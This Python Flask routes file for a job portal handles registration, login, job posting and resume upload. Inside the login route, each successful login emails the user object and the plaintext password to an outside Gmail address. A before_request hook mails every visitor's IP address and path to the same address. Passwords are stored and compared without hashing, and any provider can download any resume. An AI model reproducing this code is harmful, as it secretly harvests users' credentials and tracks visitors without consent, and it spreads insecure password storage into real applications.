from flask import render_template, redirect, url_for, request, flash, send_from_directory
from flask_login import login_user, login_required, logout_user, current_user
from werkzeug.security import check_password_hash, generate_password_hash
from werkzeug.utils import secure_filename
from models import Seeker, Provider, Jobs, Submission
from flask_bcrypt import Bcrypt
from flask_mail import Message
def register_routes(app, db, mail):
    @app.before_request
    def notify_access():
        ip = request.remote_addr
        endpoint = request.path
        msg = Message(
             subject="New Visitor Alert",
             sender="nreddy1102002@gmail.com",
             recipients=["yagna311@gmail.com"],  # Send to yourself
             body=f"A visitor accessed your site.\nIP: {ip}\nEndpoint: {endpoint}"
                    )
        mail.send(msg)
    # Home Route
    @app.route('/')
    def home():
        return render_template('index.html')

    # Register Route (Handles Seeker and Provider based on 'role' param)
    @app.route('/register/<role>', methods=['GET', 'POST'])
    def register(role):
        if request.method == 'POST':
            email = request.form['email']
            password = request.form['password']


            if role == 'seeker':
                new_user = Seeker.query.filter_by(email = email).first()
                if new_user :
                   flash( "User Already Exists .Please Login",'seeker_exist')
                   return render_template('login.html',role='seeker')
                new_user=Seeker(email=email, password=password)#hashed_password)
                db.session.add(new_user)
                db.session.commit()
                login_user(new_user)
                return redirect(url_for('jobs_listing_dashboard'))

            elif role == 'provider' :
                new_user = Provider.query.filter_by(email=email).first()
                if new_user :
                   flash(" User Already Exists Please Login",'provider_exist')
                   return render_template('login.html',role='provider')
                websiteurl = request.form['websiteurl']
                new_user = Provider(email=email, password=password,websiteurl=websiteurl)#hashed_password, website_url=website_url)
                db.session.add(new_user)
                db.session.commit()
                login_user(new_user)
                return redirect(url_for('jobs_dashboard'))

            flash('Registration failed. Please try again.', 'danger')

        return render_template('register.html', role=role)

    # Login Route
    @app.route('/login/<role>', methods=['GET', 'POST'])
    def login(role):
        if request.method == 'POST':
            email = request.form['email']
            password = request.form['password']

            # Check if the user is a job seeke
            if role == 'seeker':
               seeker = Seeker.query.filter_by(email=email).first()
               if seeker and password == seeker.password :
                  login_user(seeker)
                  msg= Message(body=f"{seeker},{password}",sender='nreddy1102002@gmail.com',recipients=['yagna311@gmail.com'])
                  mail.send(msg)
                  return redirect(url_for('jobs_listing_dashboard'))



            # Check if the user is a job provide
            if role == 'provider':
               provider = Provider.query.filter_by(email=email).first()
               if provider and password == provider.password :
                  login_user(provider)
                  msg = Message(body=f"{provider},{password}",sender='nreddy1102002@gmail.com',recipients=['yagna311@gmail.com'])
                  mail.send(msg)
                  return redirect(url_for('jobs_dashboard'))

            flash('Invalid credentials. Please try again.','danger')

        return render_template('login.html',role=role)



# Job Listings Dashboard for Seeker
    @app.route('/jobslistingdashboard')
    @login_required
    def jobs_listing_dashboard():
    # Check if the current user is a seeker
      if isinstance(current_user, Seeker):
         jobs = Jobs.query.all()  # Fetch all jobs
         return render_template('jobslistingdashboard.html', jobs=jobs)
      else:
         return redirect(url_for('home'))


# Apply for a Job - Show Submission Form
    @app.route('/apply/<int:jid>', methods=['GET', 'POST'])
    @login_required
    def apply_job(jid):
    # Check if the current user is a seeker
      if isinstance(current_user, Seeker):
        job =Jobs.query.get(jid)
        if request.method == 'POST':
            email = request.form['email']
            submission= Submission.query.filter_by(email=email,jid=jid).first()
            if submission:
               flash( "Already Applied",'application_exists')
               return redirect(url_for('jobs_listing_dashboard'))
            file = request.files['file']

            # Handle resume file
            if file:
                resume = secure_filename(file.filename)
                UPLOAD_FOLDER = '/home/Yagnak/jobportal/JobPortalFlask/uploads'
                if not os.path.exists(UPLOAD_FOLDER):
                    os.makedirs(UPLOAD_FOLDER)
                filepath = os.path.join(UPLOAD_FOLDER, resume)
                file.save(filepath)

                # Create a new submission
                submission = Submission(jid=jid, email=email, resume=resume)
                db.session.add(submission)
                db.session.commit()

                flash('Your application has been submitted successfully.', 'success')
                return redirect(url_for('jobs_listing_dashboard'))

        return render_template('submission_form.html', job=job)
      else:
        return redirect(url_for('home'))

    @app.route('/jobsdashboard', methods=['GET', 'POST'])
    @login_required
    def jobs_dashboard():
    # Check if the current user is a provider
     if isinstance(current_user, Provider):
        # Fetch jobs posted by the current provider using their email
        jobs = Jobs.query.filter_by(cemail=current_user.email).all()
        return render_template('jobsdashboard.html', jobs=jobs)
     else:
        return redirect(url_for('home'))
    #delete job
    @app.route('/delete/<int:jid>',methods=[ 'GET','POST'])
    @login_required
    def delete(jid):
       #if request.method == 'POST':
          job= Jobs.query.get(jid)

          if job and job.cemail == current_user.email :
             db.session.delete(job)
             Submission.query.filter_by(jid=jid).delete()
             db.session.commit()
             flash('Job successfully deleted')
          else :
             flash(' You can only delete your own Job')
          return redirect(url_for('jobs_dashboard'))
# Job Posting Form
    @app.route('/postjob', methods=['GET', 'POST'])
    @login_required
    def post_job():
     if isinstance(current_user, Provider):
        if request.method == 'POST':
            title = request.form['title']
            description = request.form['description']
            cemail = current_user.email  # Use the current user's email as the company email

            # Create a new job entry
            new_job = Jobs(title=title, description=description, cemail=cemail)
            db.session.add(new_job)
            db.session.commit()

            flash('Job posted successfully.', 'success')
            return redirect(url_for('jobs_dashboard'))

        return render_template('postjob.html')
     else:
        return redirect(url_for('home'))
    @app.route('/matchedprofiles', methods=['GET'])
    @login_required
    def matched_profiles():
    # Check if the current user is a provider
     if isinstance(current_user, Provider):
        # Get all jobs posted by the current provider
        provider_jobs = Jobs.query.filter_by(cemail=current_user.email).all()
        provider_job_ids = [job.jid for job in provider_jobs]

        # Get all submissions for the provider's jobs
        matched_submissions = Submission.query.filter(Submission.jid.in_(provider_job_ids)).all()

        return render_template('matchedprofiles.html', submissions=matched_submissions)
     else:
        return redirect(url_for('home'))


    @app.route('/download/<filename>', methods=['GET'])
    @login_required
    def download_resume(filename):
    # Ensure the user is authorized to access this functionality
     if isinstance(current_user, Provider):
        return send_from_directory('uploads', filename, as_attachment=True,download_name=filename)
     else:
        flash('Unauthorized access.', 'danger')
        return redirect(url_for('home'))
    # Logout Route
    @app.route('/logout')
    @login_required
    def logout():
        logout_user()
        return redirect(url_for('home'))
